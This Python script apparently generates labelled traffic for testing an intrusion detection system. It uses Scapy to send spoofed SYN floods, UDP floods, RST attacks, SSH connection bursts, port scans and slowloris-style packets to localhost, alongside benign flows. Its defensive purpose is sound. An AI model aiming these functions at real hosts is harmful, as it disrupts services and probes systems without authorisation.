"""
simulation/traffic_generator.py
─────────────────────────────────
Generates synthetic attack and benign traffic using Scapy.
Sends packets to localhost (127.0.0.1) — safe, no external network used.
Capture with Wireshark on the loopback interface while running this.

REQUIRES:
  pip install scapy
  Run as Administrator (Windows) or sudo (Linux/Mac)
  Wireshark + Npcap installed
"""

import time
import random
import sys

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP,
        send, sendp, RandShort, RandIP,
        Ether, conf
    )
    conf.verb = 0  # suppress Scapy output
except ImportError:
    print('ERROR: Scapy not installed. Run: pip install scapy')
    sys.exit(1)

TARGET_IP   = '127.0.0.1'
ATTACKER_IP = '10.0.0.99'   # simulated attacker source IP


# ── ATTACK 1: SYN FLOOD ───────────────────────────────────────────────────────
def syn_flood(target=TARGET_IP, port=80, count=200, delay=0.005):
    """
    Sends TCP SYN packets with no ACK response.
    Classic SYN flood — exhausts server connection table.
    Rule triggered: SYN Flag Cnt > threshold, ACK Flag Cnt == 0
    """
    print(f'[SYN FLOOD] Sending {count} SYN packets → {target}:{port}')
    for i in range(count):
        pkt = IP(src=ATTACKER_IP, dst=target) / \
              TCP(sport=RandShort(), dport=port, flags='S', seq=random.randint(1000, 9000))
        send(pkt, verbose=False)
        time.sleep(delay)
    print(f'[SYN FLOOD] Done — {count} packets sent')


# ── ATTACK 2: DDOS (UDP FLOOD) ────────────────────────────────────────────────
def ddos_udp_flood(target=TARGET_IP, port=53, count=500, delay=0.001):
    """
    Sends UDP packets at extremely high rate.
    Rule triggered: Flow Pkts/s > threshold
    """
    print(f'[DDOS] Sending {count} UDP packets at high rate → {target}:{port}')
    payload = b'X' * 512
    for i in range(count):
        pkt = IP(src=ATTACKER_IP, dst=target) / \
              UDP(sport=RandShort(), dport=port) / payload
        send(pkt, verbose=False)
        time.sleep(delay)
    print(f'[DDOS] Done — {count} packets sent')


# ── ATTACK 3: RST ATTACK ──────────────────────────────────────────────────────
def rst_attack(target=TARGET_IP, port=443, count=150, delay=0.01):
    """
    Sends TCP RST packets to tear down connections.
    Rule triggered: RST Flag Cnt > threshold
    """
    print(f'[RST ATTACK] Sending {count} RST packets → {target}:{port}')
    for i in range(count):
        pkt = IP(src=ATTACKER_IP, dst=target) / \
              TCP(sport=RandShort(), dport=port, flags='R', seq=random.randint(1000, 50000))
        send(pkt, verbose=False)
        time.sleep(delay)
    print(f'[RST ATTACK] Done — {count} packets sent')


# ── ATTACK 4: BRUTE FORCE (SSH) ───────────────────────────────────────────────
def brute_force_ssh(target=TARGET_IP, port=22, count=100, delay=0.02):
    """
    Simulates repeated TCP connection attempts to SSH port.
    Rule triggered: Dst Port == 22, Tot Fwd Pkts > threshold
    """
    print(f'[BRUTE FORCE] Sending {count} SSH connection attempts → {target}:{port}')
    for i in range(count):
        # SYN
        pkt = IP(src=ATTACKER_IP, dst=target) / \
              TCP(sport=RandShort(), dport=port, flags='S')
        send(pkt, verbose=False)
        # RST to close immediately (simulate failed auth)
        pkt2 = IP(src=ATTACKER_IP, dst=target) / \
               TCP(sport=RandShort(), dport=port, flags='R')
        send(pkt2, verbose=False)
        time.sleep(delay)
    print(f'[BRUTE FORCE] Done — {count} attempts sent')


# ── ATTACK 5: PORT SCAN ───────────────────────────────────────────────────────
def port_scan(target=TARGET_IP, start_port=1, end_port=1024, delay=0.003):
    """
    Sends SYN packets to sequential ports.
    Rule triggered: short duration, very few packets per flow, no response
    """
    count = end_port - start_port
    print(f'[PORT SCAN] Scanning ports {start_port}–{end_port} on {target}')
    for port in range(start_port, end_port):
        pkt = IP(src=ATTACKER_IP, dst=target) / \
              TCP(sport=RandShort(), dport=port, flags='S')
        send(pkt, verbose=False)
        time.sleep(delay)
    print(f'[PORT SCAN] Done — {count} ports scanned')


# ── ATTACK 6: SLOWLORIS ───────────────────────────────────────────────────────
def slowloris(target=TARGET_IP, port=80, connections=50, delay=0.1):
    """
    Sends partial HTTP headers slowly to hold connections open.
    Low packet rate but sustained connection holding.
    """
    print(f'[SLOWLORIS] Opening {connections} slow connections → {target}:{port}')
    partial_headers = b'GET / HTTP/1.1\r\nHost: target\r\nX-a: '
    for i in range(connections):
        pkt = IP(src=ATTACKER_IP, dst=target) / \
              TCP(sport=RandShort(), dport=port, flags='PA') / \
              partial_headers
        send(pkt, verbose=False)
        time.sleep(delay)
    print(f'[SLOWLORIS] Done — {connections} slow connections sent')


# ── BENIGN TRAFFIC ────────────────────────────────────────────────────────────
def benign_traffic(target=TARGET_IP, count=100, delay=0.02):
    """
    Simulates normal HTTP/HTTPS browsing traffic.
    Normal SYN → data → FIN/ACK pattern.
    """
    print(f'[BENIGN] Sending {count} normal traffic flows → {target}')
    ports = [80, 443, 8080]
    for i in range(count):
        port = random.choice(ports)
        sport = random.randint(49152, 65535)

        # SYN
        send(IP(src=ATTACKER_IP, dst=target) /
             TCP(sport=sport, dport=port, flags='S'), verbose=False)
        # ACK + data
        send(IP(src=ATTACKER_IP, dst=target) /
             TCP(sport=sport, dport=port, flags='PA') /
             b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n', verbose=False)
        # FIN
        send(IP(src=ATTACKER_IP, dst=target) /
             TCP(sport=sport, dport=port, flags='FA'), verbose=False)
        time.sleep(delay)
    print(f'[BENIGN] Done — {count} normal flows sent')


# ── RUN ALL ───────────────────────────────────────────────────────────────────
def run_full_simulation():
    """
    Runs all attack types + benign traffic in sequence.
    Keep Wireshark open on loopback before calling this.
    """
    print('\n' + '='*60)
    print('  HYBRID IDS — TRAFFIC SIMULATION')
    print('  Make sure Wireshark is capturing on loopback!')
    print('='*60 + '\n')

    input('Press ENTER when Wireshark is ready...\n')

    # Benign first
    benign_traffic(count=50)
    time.sleep(1)

    # Attacks
    syn_flood(count=200)
    time.sleep(1)

    ddos_udp_flood(count=300)
    time.sleep(1)

    rst_attack(count=150)
    time.sleep(1)

    brute_force_ssh(count=80)
    time.sleep(1)

    port_scan(start_port=1, end_port=200)
    time.sleep(1)

    slowloris(connections=30)
    time.sleep(1)

    # More benign to mix in
    benign_traffic(count=50)

    print('\n' + '='*60)
    print('  SIMULATION COMPLETE')
    print('  Stop Wireshark and export as .pcap')
    print('  Then run CICFlowMeter on the .pcap file')
    print('='*60 + '\n')


if __name__ == '__main__':
    run_full_simulation()
